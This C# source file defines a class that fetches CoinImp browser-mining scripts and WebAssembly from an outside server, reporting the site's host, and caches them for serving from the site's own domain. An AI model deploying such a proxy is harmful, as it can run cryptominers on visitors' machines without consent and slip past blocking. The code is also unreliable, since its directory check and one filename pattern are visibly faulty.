using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text.RegularExpressions;
using System.Web;
using SignalRService.Utils;

namespace SignalRService.Utils
{
    public class CoinImpScriptProvider
    {
        private string ScrUrl = "http://www.wasm.stream";
        private int CacheTimeSec = 3600;
        private string CacheDir = "coinimp-cache";

        private bool CheckCacheDir()
        {
            if(!File.Exists(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, CacheDir)))
            {
                System.IO.Directory.CreateDirectory(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, CacheDir));
            }
            var fullCacheDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, CacheDir);
            DirectoryInfo dirInfo = new DirectoryInfo(fullCacheDir);
            if (dirInfo.IsWriteable() )
                return true;

            return false;
        }

        private bool GetFileFromServer(string filename)
        {
            try
            {
                string filecontent = "";
                Uri target = new Uri(ScrUrl + "?filename=" + filename + "&host=" + HttpContext.Current.Request.Url.GetLeftPart(UriPartial.Authority));
                using (WebClient client = new WebClient())
                {
                    filecontent = client.DownloadString(target.AbsoluteUri);
                }
                
                File.WriteAllText(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, CacheDir, filename), filecontent);
                return true;
            }
            catch (Exception ex)
            {
                return false;
            }

        }

        private bool CheckFileName(string filename)
        {
            Regex rx0 = new Regex("^\\w{4}\\.js$");
            Regex rx1 = new Regex("^\\w{6}\\.js$");
            Regex rx2 = new Regex("^\\w{ 7 }\\.min\\.js\\.mem$");
            Regex rx3 = new Regex("^\\w{8}\\.wasm$");

            return rx0.IsMatch(filename) || rx1.IsMatch(filename) || rx2.IsMatch(filename) || rx3.IsMatch(filename);
        }

        public string GetScript(string filename)
        {
            if (!CheckFileName(filename))
                return "";

            if (!CheckCacheDir())
                return "";

            if (!File.Exists(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, CacheDir, filename)))
            {
                if (GetFileFromServer(filename))
                    return File.ReadAllText(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, CacheDir, filename));
                else
                    return "";
            }
            else
            {
                FileInfo fi = new FileInfo(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, CacheDir, filename));
                string content = File.ReadAllText(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, CacheDir, filename));
                if (fi.CreationTime.AddSeconds(CacheTimeSec) < DateTime.Now)
                {
                    File.Delete(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, CacheDir, filename));
                }
                return content;
            }
        }
    }
}